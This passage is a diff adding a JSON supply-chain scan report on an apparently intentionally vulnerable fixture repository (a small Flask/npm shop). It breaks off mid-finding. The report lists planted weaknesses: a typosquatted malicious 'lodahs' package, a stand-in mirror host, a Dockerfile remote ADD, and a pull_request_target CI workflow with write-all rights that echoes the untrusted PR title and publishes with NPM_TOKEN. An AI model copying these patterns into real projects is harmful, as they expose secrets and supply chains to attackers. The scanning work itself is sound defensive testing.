@@ -1,0 +1,4133 @@
+{
+ "schema_version": "1.0",
+ "generated_at": "2026-11-23T18:05:47Z",
+ "run_id": "20261123-233524-897e16",
+ "repo": {
+  "url": "/work/guardian-fixture",
+  "owner": null,
+  "name": "guardian-fixture",
+  "branch": null,
+  "commit": "df87b2a5e64ecef617911cdb8a88084d74831dd3",
+  "clone_path": "/work/guardian-fixture",
+  "history_available": true,
+  "is_local": true
+ },
+ "dossier": {
+  "app_type": "web application (flask)",
+  "exposure": "network_facing",
+  "summary": "web application (flask); ecosystems npm, pypi; 13 resolved components (11 direct); exposure network_facing.",
+  "claims": [
+   {
+    "text": "`package.json` is locked by `package-lock.json` (resolution committed)",
+    "type": "fact",
+    "evidence_ids": [
+     "ev_a22aee379b"
+    ],
+    "confidence": "high",
+    "verifier_status": "verified",
+    "reason": null
+   },
+   {
+    "text": "`requirements-dev.txt` pins exact versions and acts as its own lock (resolution committed)",
+    "type": "fact",
+    "evidence_ids": [
+     "ev_9836351739"
+    ],
+    "confidence": "high",
+    "verifier_status": "verified",
+    "reason": null
+   },
+   {
+    "text": "`requirements.txt` pins exact versions and acts as its own lock (resolution committed)",
+    "type": "fact",
+    "evidence_ids": [
+     "ev_d223baacd5"
+    ],
+    "confidence": "high",
+    "verifier_status": "verified",
+    "reason": null
+   },
+   {
+    "text": "route `/checkout` (POST) is handled by `checkout`",
+    "type": "fact",
+    "evidence_ids": [
+     "ev_bf4b09c7fa"
+    ],
+    "confidence": "high",
+    "verifier_status": "verified",
+    "reason": null
+   },
+   {
+    "text": "container built from `Dockerfile` on base image `node`",
+    "type": "fact",
+    "evidence_ids": [
+     "ev_071cfeb260"
+    ],
+    "confidence": "high",
+    "verifier_status": "verified",
+    "reason": null
+   },
+   {
+    "text": "application appears network facing: 1 HTTP route(s) found; Dockerfile EXPOSE [8000]",
+    "type": "inference",
+    "evidence_ids": [
+     "ev_6e6960fd2b"
+    ],
+    "confidence": "medium",
+    "verifier_status": "verified",
+    "reason": null
+   }
+  ],
+  "limits": [
+   "Static analysis only: imports and calls are evidence of reference, not proof of runtime use.",
+   "Dynamic imports, plugins and configuration-driven loading are not resolved.",
+   "SBOM confidence is low: requirements-dev.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped); requirements.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped); Syft and Trivy unavailable; SBOM built from native lockfile/manifest parsing only"
+  ],
+  "generated_by": "rule-based"
+ },
+ "summary": {
+  "components": 13,
+  "direct": 11,
+  "transitive": 2,
+  "findings": 34,
+  "bands": {
+   "P0": 5,
+   "P1": 9,
+   "P2": 6,
+   "P3": 14
+  },
+  "vulnerabilities": 13,
+  "supply_chain_signals": 12,
+  "container_ci": 8,
+  "secrets": 1
+ },
+ "inventory": {
+  "ecosystems": [
+   "npm",
+   "pypi"
+  ],
+  "languages": {
+   "Python": 13,
+   "YAML": 2,
+   "JavaScript": 2
+  },
+  "manifests": [
+   {
+    "path": "package.json",
+    "ecosystem": "npm",
+    "project_name": "guardian-fixture",
+    "dependency_count": 4,
+    "entry_points": {
+     "main": "index.js"
+    }
+   },
+   {
+    "path": "requirements-dev.txt",
+    "ecosystem": "pypi",
+    "project_name": null,
+    "dependency_count": 1,
+    "entry_points": {}
+   },
+   {
+    "path": "requirements.txt",
+    "ecosystem": "pypi",
+    "project_name": null,
+    "dependency_count": 6,
+    "entry_points": {}
+   }
+  ],
+  "lockfiles": [
+   {
+    "manifest": "package.json",
+    "ecosystem": "npm",
+    "lockfile": "package-lock.json",
+    "present": true,
+    "committed": true,
+    "ignored_by": null,
+    "version": 3,
+    "has_integrity": true,
+    "in_sync": true,
+    "resolution": "committed",
+    "evidence_id": "ev_a22aee379b"
+   },
+   {
+    "manifest": "requirements-dev.txt",
+    "ecosystem": "pypi",
+    "lockfile": "requirements-dev.txt",
+    "present": true,
+    "committed": true,
+    "ignored_by": null,
+    "version": null,
+    "has_integrity": false,
+    "in_sync": true,
+    "resolution": "committed",
+    "evidence_id": "ev_9836351739"
+   },
+   {
+    "manifest": "requirements.txt",
+    "ecosystem": "pypi",
+    "lockfile": "requirements.txt",
+    "present": true,
+    "committed": true,
+    "ignored_by": null,
+    "version": null,
+    "has_integrity": false,
+    "in_sync": true,
+    "resolution": "committed",
+    "evidence_id": "ev_d223baacd5"
+   }
+  ],
+  "package_indexes": [],
+  "dockerfiles": [
+   {
+    "file": "Dockerfile",
+    "stages": [
+     {
+      "base_image": "node",
+      "tag": "latest",
+      "digest": null,
+      "name": null,
+      "line": 1
+     }
+    ],
+    "user": null,
+    "exposed_ports": [
+     8000
+    ],
+    "package_installs": [
+     {
+      "line": 5,
+      "op": "RUN",
+      "args": "npm install"
+     },
+     {
+      "line": 6,
+      "op": "RUN",
+      "args": "pip install -r requirements.txt"
+     }
+    ],
+    "remote_fetches": [
+     {
+      "line": 3,
+      "op": "ADD",
+      "args": "http://example.invalid/x.tgz /tmp/x.tgz"
+     }
+    ],
+    "discovered_by": "dockerfile",
+    "evidence_id": "ev_071cfeb260"
+   }
+  ],
+  "ci_workflows": [
+   {
+    "file": ".github/workflows/ci.yml",
+    "name": "ci",
+    "triggers": [
+     "pull_request_target"
+    ],
+    "permissions": "write-all",
+    "job_permissions": {},
+    "actions": [
+     {
+      "line": 8,
+      "uses": "actions/checkout@v4",
+      "action": "actions/checkout",
+      "ref": "v4",
+      "pinned_to_sha": false,
+      "job": "test"
+     },
+     {
+      "line": 9,
+      "uses": "actions/setup-node@8f4b7f84864484a7bf31766abe9204da3cbe65b3",
+      "action": "actions/setup-node",
+      "ref": "8f4b7f84864484a7bf31766abe9204da3cbe65b3",
+      "pinned_to_sha": true,
+      "job": "test"
+     }
+    ],
+    "run_steps": [
+     {
+      "line": 10,
+      "cmd": "pip install -r requirements.txt",
+      "job": "test"
+     },
+     {
+      "line": 12,
+      "cmd": "echo \"PR title: ${{ github.event.pull_request.title }}\"",
+      "job": "test"
+     },
+     {
+      "line": 14,
+      "cmd": "npm publish",
+      "job": "test"
+     }
+    ],
+    "secrets_used": [
+     "NPM_TOKEN"
+    ],
+    "discovered_by": "yaml",
+    "evidence_id": "ev_0ed874306b"
+   }
+  ],
+  "compose_services": [
+   {
+    "file": "docker-compose.yml",
+    "name": "app",
+    "image": null,
+    "tag": null,
+    "digest": null,
+    "build": true,
+    "ports": [
+     "8000:8000"
+    ],
+    "depends_on": [
+     "db"
+    ],
+    "line": 2
+   },
+   {
+    "file": "docker-compose.yml",
+    "name": "db",
+    "image": "postgres:16",
+    "tag": "16",
+    "digest": null,
+    "build": false,
+    "ports": [
+     "5432:5432"
+    ],
+    "depends_on": [],
+    "line": 8
+   }
+  ],
+  "env_var_names": [
+   {
+    "file": ".env.example",
+    "var_names": [
+     "DATABASE_URL",
+     "STRIPE_KEY"
+    ]
+   }
+  ]
+ },
+ "sbom": {
+  "path": "sbom.cdx.json",
+  "report": {
+   "tools": {
+    "syft": "failed: syft not installed and Docker unavailable",
+    "trivy": "failed: trivy not installed and Docker unavailable"
+   },
+   "jaccard": null,
+   "only_in": {},
+   "confidence": "low",
+   "resolution": "committed",
+   "notes": [
+    "requirements-dev.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped)",
+    "requirements.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped)",
+    "Syft and Trivy unavailable; SBOM built from native lockfile/manifest parsing only"
+   ]
+  },
+  "components": [
+   {
+    "purl": "pkg:npm/debug@4.3.4",
+    "name": "debug",
+    "version": "4.3.4",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "registry.npmjs.org",
+     "resolved_url": "https://registry.npmjs.org/debug/-/debug-4.3.4.tgz",
+     "integrity": "sha512-A8GKp77lZVWGdw/OAHZcOSfurNwvFDGrxvR14qdVQbJjoB/+AgPy/hpzv4YjG2rMoYV6PKMtJ3dDBqP5Jy/3eQ==",
+     "source_repo": "https://github.com/debug-js/debug",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2022-03-17T13:38:47.641Z",
+     "first_release": "2011-11-29T01:11:23.618Z",
+     "release_count": 77,
+     "source_repo": "https://github.com/debug-js/debug",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:npm/lodahs@1.0.0",
+    "name": "lodahs",
+    "version": "1.0.0",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "registry.npmjs.org",
+     "resolved_url": "https://registry.npmjs.org/lodahs/-/lodahs-1.0.0.tgz",
+     "integrity": "sha512-VDCPXfzUv9a312qFS3l2TebzcvF9x2MB/7EINHNiF8Z4rCW7ALGSqSuAO3ugKEIVIebMPPVybf10wuO+eTeJTw==",
+     "source_repo": "https://github.com/npm/security-holder",
+     "license": null,
+     "has_install_script": true
+    },
+    "metadata": {
+     "version_uploaded": "2019-11-21T18:08:28.938Z",
+     "first_release": "2019-11-25T16:49:21.220Z",
+     "release_count": 1,
+     "source_repo": "https://github.com/npm/security-holder",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:npm/lodash@4.17.21",
+    "name": "lodash",
+    "version": "4.17.21",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "deps.example.invalid",
+     "resolved_url": "http://deps.example.invalid/lodash-4.17.21.tgz",
+     "integrity": "sha512-pemTIZIWJeHENkv0jyExVl3SYVKahKHTNeBFAH7bR7iGalJgLkaGKJovsrE18fVICYVa9tNspJp4TqDgehuLdQ==",
+     "source_repo": "https://github.com/lodash/lodash",
+     "license": "MIT",
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2021-02-20T15:42:16.891Z",
+     "first_release": "2012-04-23T16:37:11.912Z",
+     "release_count": 117,
+     "source_repo": "https://github.com/lodash/lodash",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:npm/minimist@0.0.8",
+    "name": "minimist",
+    "version": "0.0.8",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": false,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "registry.npmjs.org",
+     "resolved_url": "https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz",
+     "integrity": "sha512-pJHJBDlGAh/460ZfnF2hLishHQONQUdZ+tKuETdhs2K7qKktbshBSiZApyumPaZFuZeGbAEJ7eFitRR318zvCQ==",
+     "source_repo": "https://github.com/minimistjs/minimist",
+     "license": "MIT",
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2014-02-21T04:46:49.997Z",
+     "first_release": "2013-06-25T08:17:16.343Z",
+     "release_count": 31,
+     "source_repo": "https://github.com/minimistjs/minimist",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:npm/mkdirp@0.5.1",
+    "name": "mkdirp",
+    "version": "0.5.1",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "registry.npmjs.org",
+     "resolved_url": "https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz",
+     "integrity": "sha512-3nAflncJtdKApznGz1lF5Tafo5Gkf04MW6BGpgYwgnYuLgAlYuS2dFZlpHl9lQC5d+NpBZ6HXB/Viz4EemtHXw==",
+     "source_repo": "https://github.com/isaacs/node-mkdirp",
+     "license": "MIT",
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2015-05-14T02:27:01.553Z",
+     "first_release": "2011-01-06T02:54:36.080Z",
+     "release_count": 42,
+     "source_repo": "https://github.com/isaacs/node-mkdirp",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:npm/ms@2.1.2",
+    "name": "ms",
+    "version": "2.1.2",
+    "ecosystem": "npm",
+    "scope": "prod",
+    "direct": false,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "registry.npmjs.org",
+     "resolved_url": "https://registry.npmjs.org/ms/-/ms-2.1.2.tgz",
+     "integrity": "sha512-U3BvZUy4zaPMho3KH6MEoFHNwlOs6VT2Pa0ej81Iyv0wYcvVEoREBN4IMfZMrxxf6Av16kntDeE+AERF1sWTaA==",
+     "source_repo": "https://github.com/vercel/ms",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2019-06-06T17:31:55.859Z",
+     "first_release": "2011-12-21T19:38:08.664Z",
+     "release_count": 32,
+     "source_repo": "https://github.com/vercel/ms",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:pypi/colorama@0.4.4",
+    "name": "colorama",
+    "version": "0.4.4",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/tartley/colorama",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2020-10-13T02:42:26.463288Z",
+     "first_release": "2010-04-20T02:02:19.446482Z",
+     "release_count": 46,
+     "source_repo": "https://github.com/tartley/colorama",
+     "status": "cache"
+    }
+   },
+   {
+    "purl": "pkg:pypi/flask@2.0.1",
+    "name": "flask",
+    "version": "2.0.1",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/pallets/flask",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2021-05-21T15:53:08.128824Z",
+     "first_release": "2010-04-16T14:29:37.458396Z",
+     "release_count": 64,
+     "source_repo": "https://github.com/pallets/flask",
+     "status": "live"
+    }
+   },
+   {
+    "purl": "pkg:pypi/pytest@7.0.0",
+    "name": "pytest",
+    "version": "7.0.0",
+    "ecosystem": "pypi",
+    "scope": "dev",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/pytest-dev/pytest",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2022-02-04T10:21:26.698156Z",
+     "first_release": "2010-11-25T21:00:27.474482Z",
+     "release_count": 193,
+     "source_repo": "https://github.com/pytest-dev/pytest",
+     "status": "cache"
+    }
+   },
+   {
+    "purl": "pkg:pypi/pyyaml@5.4",
+    "name": "PyYAML",
+    "version": "5.4",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/yaml/pyyaml",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2021-01-19T20:54:14.721571Z",
+     "first_release": "2011-07-01T22:59:26.759009Z",
+     "release_count": 32,
+     "source_repo": "https://github.com/yaml/pyyaml",
+     "status": "cache"
+    }
+   },
+   {
+    "purl": "pkg:pypi/requests@2.25.1",
+    "name": "requests",
+    "version": "2.25.1",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/psf/requests",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2020-12-16T19:38:34.329342Z",
+     "first_release": "2011-02-14T08:49:42.641660Z",
+     "release_count": 160,
+     "source_repo": "https://github.com/psf/requests",
+     "status": "cache"
+    }
+   },
+   {
+    "purl": "pkg:pypi/sqlalchemy@1.4.20",
+    "name": "SQLAlchemy",
+    "version": "1.4.20",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/sqlalchemy/sqlalchemy",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2021-06-28T20:35:55.699125Z",
+     "first_release": "2006-02-14T03:11:34Z",
+     "release_count": 344,
+     "source_repo": "https://github.com/sqlalchemy/sqlalchemy",
+     "status": "cache"
+    }
+   },
+   {
+    "purl": "pkg:pypi/stripe@2.60.0",
+    "name": "stripe",
+    "version": "2.60.0",
+    "ecosystem": "pypi",
+    "scope": "prod",
+    "direct": true,
+    "source": "lockfile",
+    "seen_by": [
+     "lockfile"
+    ],
+    "origin": {
+     "registry": "pypi.org",
+     "resolved_url": null,
+     "integrity": null,
+     "source_repo": "https://github.com/stripe/stripe-python",
+     "license": null,
+     "has_install_script": false
+    },
+    "metadata": {
+     "version_uploaded": "2021-07-14T17:30:17.232824Z",
+     "first_release": "2011-10-29T10:49:30.123083Z",
+     "release_count": 596,
+     "source_repo": "https://github.com/stripe/stripe-python",
+     "status": "cache"
+    }
+   }
+  ]
+ },
+ "graph": {
+  "path": "graph.json",
+  "counts": {
+   "project": 1,
+   "package": 13,
+   "artifact": 13,
+   "source_module": 15,
+   "function": 10,
+   "secret": 2,
+   "model": 1,
+   "db_table": 2,
+   "route": 1,
+   "input": 1,
+   "sensitive_call": 2,
+   "external_service": 2,
+   "dockerfile": 1,
+   "image": 2,
+   "workflow": 1,
+   "action": 2,
+   "compose_service": 2,
+   "edge:DECLARES": 11,
+   "edge:CONTAINS": 15,
+   "edge:EXPOSES": 1,
+   "edge:BUILT_BY": 1,
+   "edge:CI": 1,
+   "edge:RUNS_SERVICE": 2,
+   "edge:HAS_ARTIFACT": 13,
+   "edge:DEPENDS_ON": 2,
+   "edge:IMPORTS": 10,
+   "edge:DEFINES": 11,
+   "edge:USES": 9,
+   "edge:READS_ENV": 2,
+   "edge:MAPS_TO": 1,
+   "edge:IMPORTS_MODULE": 8,
+   "edge:CALLS": 4,
+   "edge:WRITES_DB": 2,
+   "edge:CONTACTS": 2,
+   "edge:SENSITIVE_CALL": 2,
+   "edge:HANDLED_BY": 1,
+   "edge:INPUT_TO": 1,
+   "edge:BASED_ON": 2,
+   "edge:USES_ACTION": 2
+  },
+  "validation": {
+   "dangling_edges": [],
+   "duplicate_identities": [],
+   "invalid_purls": [],
+   "orphans": [],
+   "cycles": [],
+   "multiple_versions": {},
+   "unversioned": [],
+   "missing_relationships": []
+  },
+  "discrepancies": [
+   {
+    "package": "pkg:npm/lodash",
+    "name": "lodash",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:npm/mkdirp",
+    "name": "mkdirp",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/flask",
+    "name": "flask",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/pyyaml",
+    "name": "PyYAML",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/requests",
+    "name": "requests",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/sqlalchemy",
+    "name": "SQLAlchemy",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/stripe",
+    "name": "stripe",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": true,
+    "status": "declared+resolved+imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:npm/debug",
+    "name": "debug",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:npm/lodahs",
+    "name": "lodahs",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/colorama",
+    "name": "colorama",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ]
+   },
+   {
+    "package": "pkg:pypi/pytest",
+    "name": "pytest",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "dev"
+    ]
+   },
+   {
+    "package": "pkg:npm/minimist",
+    "name": "minimist",
+    "ecosystem": "npm",
+    "declared": false,
+    "resolved": true,
+    "imported": false,
+    "status": "transitive-only",
+    "declared_scopes": []
+   },
+   {
+    "package": "pkg:npm/ms",
+    "name": "ms",
+    "ecosystem": "npm",
+    "declared": false,
+    "resolved": true,
+    "imported": false,
+    "status": "transitive-only",
+    "declared_scopes": []
+   }
+  ],
+  "execution_paths": [
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout"
+    ],
+    "sink": "flask",
+    "sink_type": "package",
+    "rel": "USES",
+    "locator": "app/api/routes.py:14"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "send_event"
+    ],
+    "sink": "requests",
+    "sink_type": "package",
+    "rel": "USES",
+    "locator": "app/utils/helpers.py:6"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "send_event"
+    ],
+    "sink": "collect.analytics-example.net",
+    "sink_type": "external_service",
+    "rel": "CONTACTS",
+    "locator": "app/utils/helpers.py:6"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "send_event"
+    ],
+    "sink": "requests.post",
+    "sink_type": "sensitive_call",
+    "rel": "SENSITIVE_CALL",
+    "locator": "app/utils/helpers.py:6"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge"
+    ],
+    "sink": "SQLAlchemy",
+    "sink_type": "package",
+    "rel": "USES",
+    "locator": "app/payments/service.py:12"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge"
+    ],
+    "sink": "orders",
+    "sink_type": "db_table",
+    "rel": "WRITES_DB",
+    "locator": "app/payments/service.py:14"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge"
+    ],
+    "sink": "database (unknown table)",
+    "sink_type": "db_table",
+    "rel": "WRITES_DB",
+    "locator": "app/payments/service.py:15"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge",
+     "Order"
+    ],
+    "sink": "SQLAlchemy",
+    "sink_type": "package",
+    "rel": "USES",
+    "locator": "app/models.py:9"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge",
+     "get_client"
+    ],
+    "sink": "stripe",
+    "sink_type": "package",
+    "rel": "USES",
+    "locator": "app/payments/client.py:8"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge",
+     "get_client"
+    ],
+    "sink": "STRIPE_KEY",
+    "sink_type": "secret",
+    "rel": "READS_ENV",
+    "locator": "app/payments/client.py:8"
+   },
+   {
+    "route": "POST /checkout",
+    "inputs": [
+     "request.json"
+    ],
+    "chain": [
+     "checkout",
+     "charge",
+     "get_client"
+    ],
+    "sink": "Stripe",
+    "sink_type": "external_service",
+    "rel": "CONTACTS",
+    "locator": "app/payments/client.py:4"
+   }
+  ]
+ },
+ "history": [
+  {
+   "commit": "df87b2a5e64ecef617911cdb8a88084d74831dd3",
+   "date": "2026-11-15T10:00:00Z",
+   "author": "Fixture Bot",
+   "message": "feat: setup hooks",
+   "files_changed": [
+    "package-lock.json",
+    "package.json"
+   ],
+   "added": [
+    "lodahs"
+   ],
+   "removed": [],
+   "changed": [],
+   "baseline": false,
+   "discovered_by": "git"
+  },
+  {
+   "commit": "38e213c9c1ed5892335be4fdda7b405cd028365c",
+   "date": "2026-11-14T10:00:00Z",
+   "author": "Fixture Bot",
+   "message": "chore: use mirror",
+   "files_changed": [
+    "package-lock.json"
+   ],
+   "added": [],
+   "removed": [],
+   "changed": [],
+   "baseline": false,
+   "discovered_by": "git"
+  },
+  {
+   "commit": "d0ff68ed9873b43ff3850e620c886f98e07a57e1",
+   "date": "2026-11-13T10:00:00Z",
+   "author": "Fixture Bot",
+   "message": "chore: refresh lockfile",
+   "files_changed": [
+    "package-lock.json"
+   ],
+   "added": [],
+   "removed": [],
+   "changed": [],
+   "baseline": false,
+   "discovered_by": "git"
+  },
+  {
+   "commit": "70459f7c12fd50248548b91108db1d743890a6d3",
+   "date": "2026-11-12T10:00:00Z",
+   "author": "Fixture Bot",
+   "message": "add analytics, bump deps",
+   "files_changed": [
+    "package-lock.json",
+    "package.json",
+    "requirements.txt"
+   ],
+   "added": [
+    "colorama"
+   ],
+   "removed": [],
+   "changed": [
+    {
+     "name": "debug",
+     "ecosystem": "npm",
+     "from": "2.6.9",
+     "to": "4.3.4"
+    },
+    {
+     "name": "ms",
+     "ecosystem": "npm",
+     "from": "2.0.0",
+     "to": "2.1.2"
+    },
+    {
+     "name": "PyYAML",
+     "ecosystem": "pypi",
+     "from": "5.3.1",
+     "to": "5.4"
+    }
+   ],
+   "baseline": false,
+   "discovered_by": "git"
+  },
+  {
+   "commit": "7538df03f73c41983910c1f4a3200332d8c650c6",
+   "date": "2026-11-11T10:00:00Z",
+   "author": "Fixture Bot",
+   "message": "baseline: mini shop",
+   "files_changed": [
+    ".github/workflows/ci.yml",
+    "Dockerfile",
+    "docker-compose.yml",
+    "package-lock.json",
+    "package.json",
+    "requirements-dev.txt",
+    "requirements.txt"
+   ],
+   "added": [],
+   "removed": [],
+   "changed": [],
+   "baseline": true,
+   "discovered_by": "git"
+  }
+ ],
+ "findings": [
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/lodahs@1.0.0",
+   "title": "lodahs@1.0.0: Malicious code in lodahs (npm)",
+   "locator": "MAL-2025-25502",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_4bc6cce050",
+    "ev_82bbfea481"
+   ],
+   "signals": {
+    "advisory_id": "MAL-2025-25502",
+    "aliases": [],
+    "cves": [],
+    "cvss": null,
+    "cvss_vector": null,
+    "severity_band": null,
+    "fixed_versions": [],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": null,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/lodahs@1.0.0"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/lodahs@1.0.0"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [],
+    "statically_referenced": false,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2025-08-14T18:52:04Z",
+    "summary": "Malicious code in lodahs (npm)",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known malicious package",
+   "band": "P0",
+   "band_reason": "OSV lists this package version in a malicious-package advisory",
+   "status": "open",
+   "id": "c7b4ef59f47a",
+   "explanation": {
+    "finding_id": "c7b4ef59f47a",
+    "claims": [
+     {
+      "text": "pkg:npm/lodahs@1.0.0 matches advisory MAL-2025-25502 (severity unknown)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_4bc6cce050"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/lodahs@1.0.0",
+   "title": "lodahs@1.0.0: lodahs is malware",
+   "locator": "GHSA-hm6q-r2jc-cpqh",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_5b910a8dea",
+    "ev_82bbfea481"
+   ],
+   "signals": {
